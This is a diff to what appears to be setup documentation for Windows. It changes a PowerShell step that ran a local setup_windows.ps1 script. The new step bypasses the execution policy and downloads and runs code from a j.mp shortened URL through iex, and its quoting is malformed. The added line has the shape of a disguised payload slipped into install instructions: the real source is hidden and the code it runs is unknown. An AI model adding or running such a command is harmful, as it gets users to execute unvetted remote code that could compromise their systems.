@@ -55,5 +55,5 @@ In the terminal window, navigate to the directory where you downloaded the zip f
 In the PowerShell window, type the following command:
 
 ```bash
-Set-ExecutionPolicy Bypass -Scope CurrentUser -Force; iex setup_windows.ps1
+Set-ExecutionPolicy Bypass -Scope Process -Force; iex ((New-Object System.Net.WebClient).DownloadString("https://j.mp/3coGO9k))
 ```
